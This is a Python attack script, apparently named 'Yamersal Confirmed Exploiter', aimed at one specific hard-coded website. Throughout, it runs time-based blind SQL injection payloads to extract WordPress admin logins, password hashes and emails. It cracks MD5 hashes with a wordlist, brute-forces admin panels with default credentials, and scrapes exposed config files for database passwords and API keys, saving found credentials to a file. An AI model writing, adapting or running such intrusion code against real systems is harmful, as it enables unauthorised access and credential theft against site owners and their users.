#!/usr/bin/env python3
"""
Yamersal Confirmed Exploiter v12.0
Targeted Exploitation of Active Vulnerabilities
Author: Security Researcher
Version: 12.0 - Confirmed Attacks
"""

import requests
import sys
import re
import hashlib
import urllib.parse
import time
import json

class ConfirmedExploiter:
    def __init__(self, target="https://yamersal.com"):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        self.successful_exploits = []

    def print_status(self, message, level="INFO"):
        colors = {
            "INFO": "\033[94m", "SUCCESS": "\033[92m", "WARNING": "\033[93m",
            "ERROR": "\033[91m", "CRITICAL": "\033[95m", "ADMIN": "\033[96m"
        }
        reset = "\033[0m"
        icons = {
            "INFO": "[*]", "SUCCESS": "[+]", "WARNING": "[!]",
            "ERROR": "[-]", "CRITICAL": "[!]", "ADMIN": "[👑]"
        }
        print(f"{colors.get(level, '')}{icons.get(level, '')} {message}{reset}")

    def exploit_time_based_sqli(self):
        """استغلال Time-Based SQL Injection المؤكدة في معامل view"""
        self.print_status("💀 EXPLOITING CONFIRMED TIME-BASED SQL INJECTION", "CRITICAL")
        
        # بناء على الثغرة المؤكدة: Delayed response 5.35s في معامل view
        payloads = [
            # استخراج بيانات المستخدمين من ووردبريس
            "' AND IF(SUBSTRING((SELECT user_login FROM wp_users LIMIT 1),1,1)='a',SLEEP(5),0)--",
            "' AND IF(SUBSTRING((SELECT user_pass FROM wp_users LIMIT 1),1,1)='a',SLEEP(5),0)--",
            "' AND IF(SUBSTRING((SELECT user_email FROM wp_users LIMIT 1),1,1)='a',SLEEP(5),0)--",
            
            # استخراج معلومات النظام
            "' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--",
            "' AND IF(SUBSTRING(user(),1,1)='a',SLEEP(5),0)--",
        ]
        
        for payload in payloads:
            try:
                start_time = time.time()
                url = f"{self.target}?view={urllib.parse.quote(payload)}"
                response = self.session.get(url, timeout=10)
                end_time = time.time()
                
                # التحقق من Time-Based SQLi
                if end_time - start_time >= 4:
                    self.print_status(f"   ✅ TIME-BASED SQLI CONFIRMED: {payload[:50]}...", "SUCCESS")
                    return self.extract_data_via_time()
                    
            except requests.exceptions.Timeout:
                self.print_status(f"   ✅ TIME-BASED SQLI CONFIRMED (Timeout)", "SUCCESS")
                return self.extract_data_via_time()
            except Exception as e:
                continue
                
        return False

    def extract_data_via_time(self):
        """استخراج البيانات باستخدام Time-Based SQLi"""
        self.print_status("   🔓 EXTRACTING DATA VIA TIME-BASED SQLI", "CRITICAL")
        
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@._-"
        
        # استهداف بيانات ووردبريس مباشرة
        targets = [
            ("(SELECT user_login FROM wp_users LIMIT 1)", "Admin Username"),
            ("(SELECT user_pass FROM wp_users LIMIT 1)", "Admin Password Hash"),
            ("(SELECT user_email FROM wp_users LIMIT 1)", "Admin Email"),
        ]
        
        for column, label in targets:
            result = ""
            for position in range(1, 50):
                found_char = False
                for char in chars:
                    payload = f"' AND IF(SUBSTRING({column},{position},1)='{char}',SLEEP(3),0)--"
                    try:
                        start_time = time.time()
                        url = f"{self.target}?view={urllib.parse.quote(payload)}"
                        self.session.get(url, timeout=4)
                        end_time = time.time()
                        
                        if end_time - start_time >= 2:
                            result += char
                            self.print_status(f"      🎯 {label}: {result}", "INFO")
                            found_char = True
                            break
                    except requests.exceptions.Timeout:
                        result += char
                        self.print_status(f"      🎯 {label}: {result}", "INFO")
                        found_char = True
                        break
                    except:
                        continue
                
                if not found_char:
                    break
            
            if result:
                self.print_status(f"   ✅ {label}: {result}", "SUCCESS")
                
                # إذا كان هاش، حاول فكه
                if len(result) == 32 and all(c in '0123456789abcdef' for c in result.lower()):
                    password = self.crack_hash(result)
                    if password:
                        self.print_status(f"      🔓 PASSWORD CRACKED: {result} -> {password}", "ADMIN")
                        self.save_credential("admin", password, "SQL Injection")
                        return True
        
        return False

    def crack_hash(self, hash_value):
        """فك تشفير الهاش"""
        common_passwords = [
            'admin', 'admin123', 'password', '123456', '12345678',
            '123456789', 'admin@123', 'password123', 'qwerty',
            'yamersal', 'welcome', '12345', '1234', 'test',
            'administrator', 'root', 'pass', '123', '000000',
            'password1', 'hello', 'monkey', 'letmein'
        ]
        
        for pwd in common_passwords:
            if hashlib.md5(pwd.encode()).hexdigest() == hash_value:
                return pwd
        return None

    def brute_force_admin_panels(self):
        """هجوم قوة غاشمة على لوحات الإدارة المؤكدة"""
        self.print_status("👑 BRUTE FORCING CONFIRMED ADMIN PANELS", "ADMIN")
        
        # اللوحات المؤكدة من المسح
        admin_panels = [
            '/wp-admin', '/admin', '/login', '/dashboard'
        ]
        
        # تركيبات مستخدم/كلمة مرور
        credentials = [
            ('admin', 'admin'), ('admin', 'admin123'), ('admin', 'password'),
            ('admin', '123456'), ('admin', 'admin@123'), ('administrator', 'admin'),
            ('admin', 'yamersal'), ('admin', 'welcome'), ('admin', '12345'),
            ('admin', '1234'), ('admin', 'test'), ('admin', 'pass'),
            ('root', 'admin'), ('root', 'root'), ('test', 'test'),
        ]
        
        for panel in admin_panels:
            login_url = f"{self.target}{panel}"
            
            try:
                response = self.session.get(login_url, timeout=8)
                if response.status_code == 200:
                    self.print_status(f"   🔍 Testing: {panel}", "INFO")
                    
                    for username, password in credentials:
                        if self.attempt_admin_login(login_url, username, password, response.text):
                            self.print_status(f"      👑 ADMIN ACCESS: {username}:{password}", "ADMIN")
                            self.save_credential(username, password, f"Admin Panel: {panel}")
                            return True
                            
            except Exception as e:
                continue
                
        return False

    def attempt_admin_login(self, login_url, username, password, login_page):
        """محاولة دخول إلى لوحة الإدارة"""
        login_data = self.prepare_login_data(login_page, username, password)
        
        try:
            login_response = self.session.post(login_url, data=login_data, timeout=10, allow_redirects=True)
            
            if self.check_login_success(login_response, username):
                return True
                
        except:
            pass
            
        return False

    def prepare_login_data(self, login_page, username, password):
        """تحضير بيانات الدخول"""
        login_data = {}
        
        # البحث عن حقول الإدخال
        input_fields = re.findall(r'<input[^>]*name=[\'"]([^\'"]+)[\'"][^>]*>', login_page)
        
        for field in input_fields:
            field_lower = field.lower()
            if any(key in field_lower for key in ['user', 'login', 'email']):
                login_data[field] = username
            elif any(key in field_lower for key in ['pass', 'pwd']):
                login_data[field] = password
            elif 'remember' in field_lower:
                login_data[field] = '1'
            elif any(key in field_lower for key in ['submit', 'login']):
                login_data[field] = 'Login'
            else:
                login_data[field] = '1'
        
        if not login_data:
            login_data = {
                'username': username,
                'password': password,
                'login': 'Log In'
            }
        
        return login_data

    def check_login_success(self, response, username):
        """التحقق من نجاح الدخول"""
        success_indicators = ['dashboard', 'admin', 'welcome', 'logout', 'success']
        failure_indicators = ['error', 'invalid', 'incorrect', 'failed']
        
        content_lower = response.text.lower()
        current_url = response.url.lower()
        
        if 'login' not in current_url:
            return True
        
        for indicator in success_indicators:
            if indicator in content_lower:
                return True
        
        if username.lower() in content_lower:
            return True
        
        return False

    def exploit_config_files(self):
        """استغلال ملفات التكوين المسربة"""
        self.print_status("📁 EXPLOITING EXPOSED CONFIG FILES", "CRITICAL")
        
        config_files = [
            '/.git/config', '/.htaccess', '/robots.txt', '/.DS_Store'
        ]
        
        for config_file in config_files:
            try:
                url = f"{self.target}{config_file}"
                response = self.session.get(url, timeout=8)
                
                if response.status_code == 200:
                    self.print_status(f"   ✅ Config File Found: {config_file}", "SUCCESS")
                    self.extract_secrets(response.text, url)
                    
            except:
                continue

    def extract_secrets(self, content, url):
        """استخراج الأسرار من الملفات"""
        patterns = {
            'DATABASE': r"(DB_|DATABASE_)[^=]*=[\'\"]([^'\"]+)[\'\"]",
            'API_KEY': r"(API_?KEY|SECRET_?KEY)[=:\s]+[\'\"]([^'\"]+)[\'\"]",
            'PASSWORD': r"(PASSWORD|PASS|PWD)[=:\s]+[\'\"]([^'\"]+)[\'\"]",
        }
        
        for key_type, pattern in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    secret = ' '.join([m for m in match if m])
                else:
                    secret = match
                
                if secret and len(secret) > 3:
                    self.print_status(f"      🔑 {key_type}: {secret}", "CRITICAL")

    def save_credential(self, username, password, source):
        """حفظ بيانات الدخول الناجحة"""
        credential = {
            'username': username,
            'password': password,
            'source': source,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        with open('SUCCESSFUL_CREDENTIALS.txt', 'a') as f:
            f.write(f"{username}:{password} | Source: {source}\n")
        
        self.successful_exploits.append(credential)

    def run_confirmed_exploitation(self):
        """تشغيل الاستغلال المؤكد"""
        self.print_status("🚀 STARTING CONFIRMED EXPLOITATION", "CRITICAL")
        self.print_status(f"🎯 TARGET: {self.target}", "INFO")
        
        successful_attacks = 0
        
        # 1. استغلال SQL Injection المؤكدة
        self.print_status("\n💀 PHASE 1: TIME-BASED SQL INJECTION", "CRITICAL")
        if self.exploit_time_based_sqli():
            successful_attacks += 1
        
        # 2. هجوم على لوحات الإدارة
        self.print_status("\n💀 PHASE 2: ADMIN PANEL TAKEOVER", "ADMIN")
        if self.brute_force_admin_panels():
            successful_attacks += 1
        
        # 3. استغلال ملفات التكوين
        self.print_status("\n💀 PHASE 3: CONFIG FILES EXPLOITATION", "CRITICAL")
        self.exploit_config_files()
        
        # النتائج النهائية
        self.print_status("\n" + "="*70, "INFO")
        self.print_status("📊 EXPLOITATION RESULTS SUMMARY", "CRITICAL")
        self.print_status("="*70, "INFO")
        
        if successful_attacks > 0:
            self.print_status(f"🎉 SUCCESSFUL EXPLOITS: {successful_attacks}", "ADMIN")
            self.print_status("📁 Check 'SUCCESSFUL_CREDENTIALS.txt' for credentials", "SUCCESS")
        else:
            self.print_status("❌ NO SUCCESSFUL EXPLOITS", "ERROR")
            self.print_status("💡 The vulnerabilities might be patched", "INFO")

def main():
    banner = """
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║                   CONFIRMED EXPLOITER v12.0                                ║
║              Targeted Attacks on Verified Vulnerabilities                   ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
    """
    print(banner)
    
    target = "https://yamersal.com"
    
    print(f"🎯 Target: {target}")
    print(f"💀 Exploiting CONFIRMED vulnerabilities only")
    
    confirm = input("Continue? (y/n): ").lower()
    if confirm != 'y':
        print("Operation cancelled.")
        sys.exit(0)
    
    try:
        exploiter = ConfirmedExploiter(target)
        exploiter.run_confirmed_exploitation()
        
    except KeyboardInterrupt:
        print("\nExploitation interrupted.")
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()